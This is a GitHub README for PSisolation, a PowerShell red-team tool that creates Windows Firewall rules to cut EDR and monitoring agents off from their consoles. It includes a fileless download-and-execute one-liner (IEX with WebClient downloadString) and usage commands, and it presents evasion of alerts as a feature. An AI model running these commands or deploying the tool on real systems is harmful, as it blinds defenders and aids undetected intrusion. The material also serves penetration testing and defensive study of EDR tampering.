# PSisolation

## Overview
PS-Isolation is a specialized tool designed to prevent EDR (Endpoint Detection and Response) and monitoring processes from communicating with their consoles. By leveraging Windows Defender Firewall rules and PowerShell automation, this script dynamically identifies and blocks network traffic for specific monitoring agents and processes. 

I also wrote this [article](https://blog.y00ga.lol/PERSO/PUBLISH/Article+perso/PSisolation%2C+in+Cyberspace+No+One+Can+Hear+You+Scream#New-NetFirewallRule) if you want to learn a bit more about it

## Key Features
- Automated Detection: Identifies EDR and monitoring tools running on the system based on predefined and customizable keywords.
- Dynamic Firewall Rules: Implements outbound traffic filtering for detected processes, preventing telemetry from reaching monitoring consoles.
- Customizable rule : Choose to block a specific processes.
- Stealth : Operates entirely in PowerShell, which you can import in memory without touching disk, ensuring minimal system footprint.
- Simple Cleanup: Quickly revert all custom rules and restore normal operations with a single command.

## Use Cases
- Isolate specific processes or tools to prevent them from reporting telemetry during engagements.
- Test EDR visibility and response.
- Enumerate potential exclusions on system without triggering alerts

## Important Notes
- Educational Purposes Only: This tool is intended for research, penetration testing engagements, and educational purposes        
- Requires Administrative Privileges to create rules

## Getting Started

- Import the script in memory

````
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/y00ga-sec/PSisolation/refs/heads/main/PSisolation.ps1')
````

- Block outgoing traffic by running directly

````
Block-MonitoringProc
````
https://github.com/user-attachments/assets/a8b62fc7-5132-477b-9489-c569c41bcc78

- or a specific process you want with : 

````
Block-SpecificProcessTraffic -ProcessPath <executablefull path>
````

- When you're done, run this to remove all rules created by the tool :

````
Unblock-AllFilters
````

https://github.com/user-attachments/assets/a647de1e-9314-4d73-886c-ba8f4cbb7356

------
# But what if the target machine does not use Windows Defende Firewall ?

Well the script got you covered ! Logic is the following :

- If PSisolation detects the victim machine has Windows Firewall enabled --> Simple retrieves EDR services name and associated executable path and create outgoing blocking firewall rules
- Otherwise, PSisolation will :
   - Backup every rule on the machine in a temporary file
   - Create outgoing blocking firewall rules for EDRs
   - Enable Windows Defender Firewall so that the PSisolation blocking rules take effect and disable every rule to avoid blocking production traffic
   - Once you're done and run `Unblock-AllFilters`, the script will restore every rule/rule state from the temporary backup file (which will also delete PSisolation blocking rules)
   - Delete backup rules temporary
   - Restore Windows Defender Firewall to its previous state 


---------
# TO DO : 
- Right now, this tool only works if the Windows Firewall is enabled, which is not always the case, so PSisolation needs to circumvent this limitation so that the Windows Firewall rules blocking rules get applied for EDR only.
